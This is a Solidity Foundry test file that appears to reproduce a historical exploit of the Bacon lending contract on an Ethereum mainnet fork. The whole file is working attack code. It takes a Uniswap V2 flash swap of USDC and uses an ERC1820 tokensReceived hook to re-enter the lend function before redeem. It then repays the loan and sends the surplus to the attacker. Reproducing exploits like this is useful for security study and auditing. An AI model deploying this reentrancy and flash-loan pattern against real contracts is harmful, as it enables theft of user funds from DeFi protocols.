// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import {IUniswapV2Pair} from "src/interfaces/IUniswapV2Pair.sol";

import {IERC20Metadata as IERC20} from "OpenZeppelin/interfaces/IERC20Metadata.sol";
import {IERC1820Registry} from "OpenZeppelin/interfaces/IERC1820Registry.sol";

interface IBacon {

    function lend(uint256 index) external;

    function redeem(uint256 index) external;

    function balanceOf(address account) external view returns (uint256);

}

contract ContractTest is Test {

    IUniswapV2Pair pair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IBacon bacon = IBacon(0xb8919522331C59f5C16bDfAA6A121a6E03A91F62);
    uint256 count = 0;

    constructor() {
        vm.createSelectFork("mainnet", 14_326_931); // fork mainnet at block 14326931

        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), bytes32(0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b), address(this)
        );
    }

    function test() public {
        emit log_named_uint("Before exploit, USDC balance of attacker:", usdc.balanceOf(msg.sender));
        pair.swap(6_360_000_000_000, 0, address(this), new bytes(1));

        emit log_named_uint("After exploit, USDC balance of attacker:", usdc.balanceOf(msg.sender));
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        usdc.approve(address(bacon), 10_000_000_000_000_000_000);
        bacon.lend(2_120_000_000_000);
        bacon.redeem(bacon.balanceOf(address(this)));
        usdc.transfer(msg.sender, ((amount0 / 997) * 1000) + 10 ** usdc.decimals());
        usdc.transfer(tx.origin, usdc.balanceOf(address(this)));
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) public {
        count += 1;
        if (count <= 2) {
            bacon.lend(2_120_000_000_000);
        }
    }

}
